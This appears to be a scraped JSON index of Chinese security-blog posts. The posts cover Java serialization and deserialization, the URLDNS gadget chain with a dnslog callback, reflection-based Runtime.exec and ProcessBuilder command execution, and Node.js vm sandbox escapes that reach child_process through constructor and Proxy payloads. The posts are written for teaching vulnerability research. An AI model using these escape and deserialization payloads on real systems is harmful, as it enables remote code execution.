//不为-1就行，不触发解析，ysoserial使通过重写getHostAddress来实现的 hashMap.put(url, \"gaoren\"); //put入我们的键值，值随便什么都行 f.set(url, -1); //修改hashCode为-1 System.out.println(hashMap); //序列化，参考java序列化 try { FileOutputStream out=new FileOutputStream(\"dnsser.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); //反序列化，参考java反序列化 FileInputStream in=new FileInputStream(\"dnsser.bin\"); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }看上面的注释应该不难理解这串代码。因为使HashMap重写了readObject方法，漏洞在它，所以这里是创建的它的对象，调用它的序列化和反序列化方法。 进行调试： 看到到了writeObject方法进行序列化。也就是ysoserial生成payload的步骤。 继续向下： 看到是readObject了，进行反序列化触发链子了，这个就不分析了，和上面的一摸一样。最后在dnslog平台可以看到请求： 也可以进行字节的序列化和反序列化： import java.io.*; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 10086); hashMap.put(url, \"gaoren\"); f.set(url, -1); System.out.println(hashMap); try { ByteArrayOutputStream out=new ByteArrayOutputStream(); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); byte[] ObjectBytes=out.toByteArray(); ByteArrayInputStream in=new ByteArrayInputStream(ObjectBytes); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }如果有生成的payload想进行验证，也可以直接之构造反序列化的方法： import java.io.*; public class main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\"out.bin\"); ObjectInputStream bit = new ObjectInputStream(fis); bit.readObject(); } }跟踪调试，效果是一样的。 参考： https://www.cnblogs.com/nice0e3/p/13772184.html#0x03-urldns%E9%93%BE%E5%88%86%E6%9E%90 https://www.anquanke.com/post/id/261724#h3-10 https://www.cnblogs.com/gk0d/p/16874157.html https://www.freebuf.com/articles/web/327710.html https://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32Ehei%3DttDRCBoD\u0026alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-1 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:5:0","tags":["java","反序列化"],"title":"URLDNS链分析","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"序列化反序列化基础 在Java语言中，实现序列化与反序列化的类： 位置： Java.io.ObjectOutputStream java.io.ObjectInputStream 序列化： ObjectOutputStream类 –\u003e writeObject() 注：该方法对参数指定的obj对象进行序列化 ，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个.ser扩展名 反序列化:　ObjectInputStream类 –\u003e readObject() 注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 java在序列化一个对象时，会调用writeObject方法，参数类型时ObjectOutputStream，开发者可以将任何内容写入这个Stream中；反序列化时会调用readObject，可以从中读取到前面写入的内容，并进行处理。 字符串序列化: import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //创建一个字节数组输出流 ObjectOutputStream objOut = new ObjectOutputStream(out); //创建对象输出流 objOut.writeObject(obj); //将传入对象进行序列化 System.out.println(out.toString()); //打印序列化内容 return out.toByteArray(); //转换为字节数组 //所以序列化一开始就是创建输出流，可以是字节文件、字节数组或者字节流，然后再创建对象输出流，最后调用writeObject进行序列化，还可以将对象流转换为字节流进行返回。 } //定义反序列化的方法，将字节流转化为对象 public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//将字节数组转化为字节输入流 ObjectInputStream objIn = new ObjectInputStream(in);//在将字节输入流初始化为对象输入流 return objIn.readObject(); //返回反序列化对象 //反序列化就是将字节流先变为字节输入流，然后再是对象输入流，最后进行反序列化。 } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; byte[] ObjectBytes=serialize(s); String after = (String) deserialize(ObjectBytes); //把对象转换为字符串 System.out.println(after); } }运行结果： 发现通过字节来看序列化内容可读性太低了，可以把序列化内容写入文件中： import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static void serialize(final Object obj) throws IOException { FileOutputStream files=new FileOutputStream(\"ser.bin\"); //创建一个文件类型对象 ObjectOutputStream objfiles = new ObjectOutputStream(files); //并将文件类型对象作为序列化时写入的位置 objfiles.writeObject(obj); //将传入对象进行序列化 } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; serialize(s); } } 对象序列化： 和字符串序列化差不多 import java.io.*; public class Main implements Serializable { //定义序列化的方法吗，将对象转化为字节流 public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //创建一个字节输出流对象 ObjectOutputStream objOut = new ObjectOutputStream(out); //并将字节输出流对象作为序列化时写入的位置 objOut.writeObject(obj); //将传入对象进行序列化 System.out.println(out.toString());//打印序列化内容 return out.toByteArray(); } //定义反序列化的方法，将字节流转化为对象 public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//将字节数组转化为字节输入流 ObjectInputStream objIn = new ObjectInputStream(in);//放入ObjectInputStream对象中待序列化 return objIn.readObject().getClass(); //readObject()就能返回序列化对象，加个getClass()更直观 } public static void main(String[] args) throws IOException, ClassNotFoundException { People people = new People(\"ZhangSan\", \"boy\", 18);//People对象，需要在创个People.java文件 byte[] ObjectBytes=serialize(people); Object after = deserialize(ObjectBytes); System.out.println(after); } }结果： 依然可以写入文件： import java.io.*; public class SerializableTest { public static void serialize(Object obj) throws Exception{ ObjectOutputStream files=new ObjectOutputStream(new FileOutputStream(\"ser2.bin\")); files.writeObject(obj); } public static void main(String[] args) throws Exception{ People people = new People(\"ZhangSan\", \"boy\", 18); serialize(people); } } 注意点： 实现Serializable和Externalizable接口的类的对象才能被序列化，最下面有解释。 Externalizable 接口继承自 Serializable 接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以采用默认的序列化方式。 实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的(用transient 关键字修饰的属性除外，不参与序列化过程) 对象序列化包括如下步骤： 1、创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 2、通过对象输出流的writeObject()方法写对象。对象反序列化的步骤如下： 1、创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 2、通过对象输入流的readObject()方法读取对象。","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"java反序列化漏洞 原理： 如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。从上面可以看到java序列化内容相比php还是比较难读的，所以很难直接构造恶意命令，但依然可以通过重写readObject来进行漏洞利用。 利用： 我们可以在People类中重写readObject方法。 private void readObject(java.io.ObjectInputStream ois) throws java.io.IOException,ClassNotFoundException{ ois.defaultReadObject(); //默认进行反序列化 Runtime.getRuntime().exec(\"calc.exe\");//多执行的命令 }运行： 那可能会好奇为什么这里重写了如readObject的方法就会执行这个readObject方法呢，同样在最下面进行了解释。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"ysoserial工具 ysoserial是java反序列化漏洞的一个工具。可以直接下载编译好的jar文件，直接就能用。 https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar或者下载源码自己进行编译，建议这样做因为方便查看 poc 的源码。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:3:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"反序列化底层分析 参考：https://www.cnblogs.com/yyhuni/p/15127416.html 反序列化的 demo， package org.example; import java.io.*; public class sertest { public static void main(String[] args) throws Exception{ people p=new people(\"gaoren\"); ser(p); deser(\"test.bin\"); } public static class people implements Serializable{ private String name; people (String name){ this.name=name; } } public static void ser(Object obj)throws Exception{ FileOutputStream out=new FileOutputStream(\"test.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(obj); } public static void deser(String filename)throws Exception{ FileInputStream in =new FileInputStream(filename); ObjectInputStream objin=new ObjectInputStream(in); Object obj=objin.readObject(); } }然后利用 SerializationDumper 查看生成的字节流， java -jar SerializationDumper-v1.13.jar -r test.bin TC_OBJECT：标记后面的数据为Object对象 TC_CLASSDESC：类描述符标识，表示一个类中的所有信息 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:0","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"调试分析 在 Object obj=objin.readObject(); 处下个断点，一路跟到 ObjectInputStream#readObject 方法，在其中调用了 readObject0 跟进，在此函数中，根据了tc值来进行switch，此时的tc值为TC_OBJECT，也就是0x73十进制数115 然后在 case TC_OBJECT 中，调用了 readOrdinaryObject， 跟进readOrdinaryObject中，发现调用了readClassDesc方法，并把值赋给了desc 继续跟进 readClassDesc，此方法用来分发处理字节流中 TC_CLASSDESC 的方法，用switch来选择需要处理的方法，这里tc的值就是 TC_CLASSDESC 的值0x72，转成10进制就是114，然后进入switch判断后转到 case TC_CLASSDESC: 跟进到 readNonProxyDesc 方法中，调用了resolveClass 再 resolveClass 中，通过 Class.forName 来实例化了 people 对象，然后返回对象。 回到 readNonProxyDesc 方法中，时cl值变成了 people 对象，然后把cl对象传入了 initNonProxy，并且赋值给了desc， 然后返回 desc 赋值给了descriptor 最后回到 readOrdinaryObject 方法中，此时的 desc 已经是 people 对象了。 总结下上面的流程顺序为： readOrdinaryObject -》 readClassDesc -》 readNonProxyDesc -》 resolveClass， readClassDesc：分发用于处理字节流中TC_CLASSDESC的方法，用switch来选择需要处理的方法 readNonProxyDesc：真正用来处理字节流中的TC_CLASSDESC方法，会调用resolveClass进行创建反序列化的对象 resolveClass：是用Class.forName来创建ObjectA对象的地方，在这里可以做一个检查校验，用于反序列化拦截。weblogic中补丁拦截就是在此进行的 然后是 readOrdinaryObject，这里的 readOrdinaryObject 就是真正操作调用序列化类中，readObject、readResolve、readExternal方法的地方， 接着上面debug，拿到了desc的值后往下走，做了一个判断 desc.isExternalizable，如果序列化的接口是Externalizable类型，就进入readExternalData，否则进入readSerialData 此处的 people 对象接口类型是Serializable，所以进入了 readSerialData 方法， 最后 readSerialData 方法中用了反射进行调用反序列化对象的 readObject 方法 到readOrdinaryObject，接下来就是调用readResolve方法的地方了 用if进行判断，为true则用反射调用反序列化对象的 readResolve 方法，这里没有重写此方法所以为 false， 最后回到 readObject0， 到这里就是反序列化的底层逻辑了，所以需要继承 Serializable 接口，然后会反射调用反序列化对象的 readobject 方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:1","tags":["java","反序列化"],"title":"java反序列化","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"基础内容 反射调用就是指通过反射机制进行的方法调用。反射机制是Java编程语言的一个重要特性，它允许程序在运行时检查、操作和实例化类，方法，字段等，并在运行时获取类的信息以及动态调用类的方法。反射机制使得Java程序可以在运行时动态地加载、探测和使用类，而不需要在编译时就知道这些类的具体信息。 通过反射机制，可以实现以下功能： 获取类的信息：可以在运行时获取类的信息，如类的名称、父类、接口、成员变量、方法等。 实例化类：可以通过类的名称动态实例化类的对象。 调用方法：可以通过方法名动态调用类的方法。 获取字段信息：可以通过字段名获取类的字段信息。 动态代理：可以在运行时动态生成代理类，实现代理相关的功能。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:1:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"java基本反射调用 反射调用一般分为4个步骤： 类的实例化 得到要调用类的class 得到要调用的类中的方法(Method) 方法调用(invoke) obj.getClass()获得类： demo： import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception{ Reflect r1= new Reflect(); //对类进行是实例化 r1.print(1,3); //直接调用 Class c = r1.getClass(); //获取实列化对象所属类的类的对象 Method m1 = c.getMethod(\"print\",int.class,int.class); //获得方法 Object i = m1.invoke(r1, 1, 2); //反射机制调用方法 } } class Reflect{ public void print(int a,int b){ System.out.println(a+b); } }上面分别是两种调用类的方法的方法 第一种是通过类的实例化直接调用， 第二种是通过类的对象用getMethod获得方法，然后利用反射机制调用方法； 至于一些函数的具体使用如getClass，getMethod,invoke可以直接问gpt。 加上throws Exception是因为getMethod()和invoke()方法会抛出NoSuchMethodException、IllegalAccessException、IllegalArgumentException等异常，可以去掉看看报错。 那么可以利用这种反射调用来调用恶意类实现rce： import java.lang.reflect.Method; public class Main{ public static void main(String[] args)throws Exception { Runtime runtime=Runtime.getRuntime(); //获得Runtime的实例化 runtime.exec(\"calc.exe\"); //实列化直接调用 Class c=runtime.getClass(); Method m1=c.getMethod(\"exec\",String.class); Object i=m1.invoke(runtime,\"calc.exe\"); //过程同上 } }为什么这里不用Runtime runtime=new Runtime();来进行实例化，这个后面再说。 剩下的步骤的就不用多解释了，通过getClass()来获取类对象，从而用getMethod获取方法，在用反射进行调用来执行命令。 Class.forName()获得类 还可以直接通过Class.forName()反射获得类（根据给定的类名加载并返回对应的 Class 对象），通过反射调用方法getRuntime得到类的实例化，最后调用exec方法。 import java.lang.reflect.Method; //引入Method类 public class Main{ public static void main(String[] args) throws Exception{ //抛出异常就不说了 Class c=Class.forName(\"java.lang.Runtime\"); //获得类得class对象 Method m1= c.getMethod(\"getRuntime\",new Class[]{}); //利用getMethod获得getRuntime方法 Object runtime=m1.invoke(null); //利用反射来调用方法getRuntime Method m2=c.getMethod(\"exec\",String.class); //利用getMethod获得getRuntime方法 Object o=m2.invoke(runtime,\"calc.exe\"); //反射调用exec方法 } }null是因为getRuntime是静态方法，静态方法不用实例化的对象就能调用。 这样可以获得Runtime得实列化对象后就能调用exec方法了。 简写一下： public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); } }这样就不用引入Method类了（当然这里虽然获得实列化对象的效果一样，还是略有区别的）这里的实列化不能直接调用方法机进行命令执行runtime.exec(\"calc.exe\"); 想要直接调用方法还需要强制类型转换： public class Main{ public static void main(String[] args) throws Exception{ Object runtime=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",new Class[]{}).invoke(null); Runtime run=(Runtime) runtime; run.exec(\"calc.exe\"); } }上面写了两种获得Class类的方法，一般是三种方法： obj.getClass()：获得实例化对象所属类的的类。 Class.forName：知道某个类的名字，想获取到这个类，直接用forName来获取。 Test.class：如果已经加载了某个类，只是想获取到它的java.lang.Class对象，可以直接拿到它的Class属性。这个方法其实不属于反射了。 综上所述，反射三要素：类的对象(类)，类的实列化对象，方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:2:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"获得类的实列化对象 一、Class.newInstance获取 获得类的实例化对象一般使用Class.newInstance（虽然上面的例子是使用的是getRuntime方法），但很多情况下会失败，因为这个方法只能调用无参构造函数，对于一些类里面没有无参构造函数或者是私有属性的构造方法就会失败。 二、静态方法调用 上面的Runtime类就是一个例子，它的无参构造函数就是私有属性，但它是单列模式，可以通过静态方法getRuntime()调用其构造函数进行实例化（搞成私有属性利用方法进行调用的目的是为了防止建立多次数据库连接）。 但是对于一些于没有静态方法的又该怎么办呢。 三、getConstructor()函数 对于没有静态方法或者构造函数有参时可以用一个新的反射方法进行获取，getConstructor()(无参有参都可以获取) 和getMethod类似，getConstructor的接收参数是构造函数列表类型（因为构造函数也支持重载），获取到构造函数再使用newInstance来执行就可以获得类的实列化对象。 例如常用的另一种命令执行方式ProcessBuilder，使用反射来获取其构造函数，然后调用start来进行命令执行： import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); //获取类 Constructor con=c.getConstructor(List.class); //获得有参构造函数，如果要获得无参就什么都不用添 Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); //进行实列化 ProcessBuilder pro = (ProcessBuilder) obj; //强制类型转换 pro.start(); //调用方法 } }全反射调用: import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(List.class); Object obj=con.newInstance(Arrays.asList(\"calc.exe\")); c.getMethod(\"start\").invoke(obj); //利用反射进行方法调用 } }进入ProcessBuilder类看见还有个有参构造方法，参数类型是ProcessBuilder(String... command)，即可变长参数 对于可变长参数，java在编译时会编译为一个数组，也就是说，下面写法底层上是等效的（不能重载） public void m1(String[] names){} public void m1(String... names){}因此对m1函数传参就直接传数组 String[] names={\"hello\",\"world\",\"!!!!\"}; m1(names)；所以还可以这样构造： import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance(new String[][]{{\"calc.exe\"}}); //因为newInstance接受的参数是Object... args，所以这里传入的是二维数组，二维数组在处理是会当作一个整体对象处理 c.getMethod(\"start\").invoke(obj); } }或者把参数强制类型转换为object： import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args)throws Exception{ Class c=Class.forName(\"java.lang.ProcessBuilder\"); Constructor con=c.getConstructor(String[].class); Object obj=con.newInstance((Object) new String[]{\"calc.exe\"}); //强制类型转换 c.getMethod(\"start\").invoke(obj); } }有参的构造方法大概就是这样了 当然这个类是可以直接调用的： public class Main{ public static void main(String[] args)throws Exception{ ProcessBuilder pro=new ProcessBuilder(\"calc.exe\"); pro.start(); } }四、getDeclared系列 构造函数为私有方法的解决办法： 这就涉及到getDeclared系列的反射了，与普通的 getMethod 、 getConstructor 区别是： getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了 getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似，不再赘述。 举个例子，上面说了Runtime的构造函数是私有方法，试一试： import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception { Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor constructor = clazz.getDeclaredConstructor(); //获取私有的无参构造函数 constructor.setAccessible(true); //修改其作用域，必须的 Object runtime = constructor.newInstance(); //进行实例化 clazz.getMethod(\"exec\", String.class).invoke(runtime, \"calc.exe\"); //反射调用方法 } }jdk11虽然有很多报错但是还是能执行： jdk1.8（java8）就能完美执行： ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:3:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"总结一下： 获取Class对象一般有三种方法Class.forName,obj.getClass,test.class 获取实列化类一般直接newInstance，失败就两种情况要么是有参构造函数，要么就是私有的。一般有静态调用方法就直接用方法，如：getRuntime,没有就Constructor配合newInstance，私有的就用getDeclared系列的反射 最后就是getMethod获取方法然后invoke进行调用方法。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:4:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"利用反射一个重要目的就是绕沙盒机制（forName） 例如上下文只有intger类型的数字，怎么获得Runtime类 123.getClass().forNmae(\"java.lang.Runtime\"); forName有两个函数重载： Class\u003c?\u003e forName(String name) Class\u003c?\u003e forName(String name, **boolean** initialize, ClassLoader loader) 第一个就是我们最常见的获取class的方式，其实可以理解为第二种方式的一个封装： Class.forName(String name) //等于 Class.forName(Stirng name,true,currentLoder)默认情况下， forName 的第一个参数是类名；第二个参数表示是否初始化；第三个参数就 是 ClassLoader 。 ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。 Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime 现在来说说第二个参数可能造成的漏洞： 第二个参数的意思是告诉java虚拟机是否执行“类初始化” 例子： public class Main { { System.out.println(\"1block initial\" + this.getClass()); } static { System.out.println(\"2initail\" + Main.class); } public Main() { System.out.println(\"3initial:\" + this.getClass()); } public static void main(String[] args) { Main main = new Main(); } }结果： 可以看到首先调用的是static{}，然后是{}，最后是构造函数{} static{}是在“类初始化”调用，而{}中的代码会在构造函数的super()后面，在当前构造函数前面 所以当有如下代码(name可控)： public void ref(String[] name)throws Exception{ Class.forName(name); }就可以构造个static{}的执行代码，例如： import java.lang.Runtime; import java.lang.Process; public class TouchFile { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"touch\", \"/tmp/success\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } }那么就会在初始化类时执行代码。 ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:5:0","tags":["java"],"title":"java反射机制","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["漏洞学习"],"content":"参考：https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLcxA2%3D7YRieD\u0026alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6 参考：https://www.anquanke.com/post/id/237032#h3-4 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:0:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"基础概念 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"一、 1：JavaScript和Nodejs之间区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此写在后端（服务端）的JavaScript就叫叫做Nodejs。 **2：**在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"二、 **nodejs作用域：**说到作用域，我们就要说一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文） 在JavaScript中window是全局对象，浏览器其他所有的属性都挂载在window下，那么在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。举个例子，console就是挂载在global下的一个全局变量，我们在用console.log输出时并不需要写成global.console.log，其他常见全局变量还有process（一会逃逸要用到） ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:1:2","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"VM沙箱逃逸 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:0","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"一、 关键函数： vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。 vm.createContext([sandbox])： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。（类似于把global变为了其他包，V8引擎变为了全局） vm.runInContext(code, contextifiedSandbox[, options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文（作用域）中执行，并且参数的值与沙箱内的参数值相同。 ","date":"2024-03-26","objectID":"/posts/nodejs-vm/:2:1","tags":["node.js","沙箱逃逸"],"title":"nodejs VM和VM2沙箱逃逸","uri":"/posts/nodejs-vm/"},{"categories":["漏洞学习"],"content":"二、 1：一般的VM沙箱逃逸 先看列子： const vm = require('vm'); const script = `m + n`; //反引号可以执行命令 const sandbox = { m: 1, n: 2 }; //给沙箱中传入对象 const context = new vm.createContext(sandbox); //创建沙箱上下文环境并将沙箱对象传递进来 const res = vm.runInContext(script, context); //沙箱内部的执行 console.log(res)执行: 这里命令是 `m+n` ，然后 context 是沙箱内的对象，如果对象改为 null 的话命令就执行不了了。 这种有对象的非常容易绕过 payload： const cc = this.toString.constructor('return process')() #通过指向sandbox（全局）的this拿到了process模块，然后通过this.toString拿到了toString函数，最后通过constructor拿到了所有函数的构造函数Function，然后通过return process拿到process模块。 cc.mainModule.require('child_process').execSync('whoami').toString() #拿到process模块后拿到子模块child_process，最后调用whoami命令执行的方法。 #execSync同步执行传入： 运行即可执行命令： 如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用（如果换为其他类型，如字典，数组就可以引用了）。 2：其他VM沙箱逃逸 示例1： const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res)可以看到这里沙箱对象变为了null，没有可以引用的对象，所以this的方法无法使用了。 这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。 原理： 上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象（返回函数调用者），我们在沙箱内就可以进行逃逸了。 payload： (() =\u003e { const a = {} a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString() } return a })()分析： 首先是创建了个箭头函数（为什么待会再说），再在函数里面创建了个对象a，给a对象创建了个toString方法（重写tostring方法）。重写的toString方法大概功能就是，给cc赋值为arguments.callee.caller获取的对象（类似于上面的this，就是获取个外部对对象），再拼接到p上，那么p的值就变为了process这个函数，再将p拼接到到最后，即可执行命令。（意思是可以直接全部拼接到一起）。最后箭头函数就是为了return a这个对象（也就是执行结果）。 arguments.callee.caller之所以会返回个对像，是因为沙箱外console.log中通过字符串拼接的方式调用了这个重写后的toString函数，触发arguments.callee.caller函数功能。 示例2： const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc)没有了字符串拼接，但打印结果为res.abc，可以用Proxy来劫持属性： payload： (() =\u003e{ const a = new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) return a })()分析： 也是为了调用外部对象。触发利用链的逻辑就是我们在get:这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。 示例3： const vm = require('vm'); const script = `...`; try { vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) { console.log(e.message) }payload； throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } })结合了示例2，因为throw了个错误，直接到了catch模块，然后console.log(e.message)触发钩子get:。（原理都大差不差了） 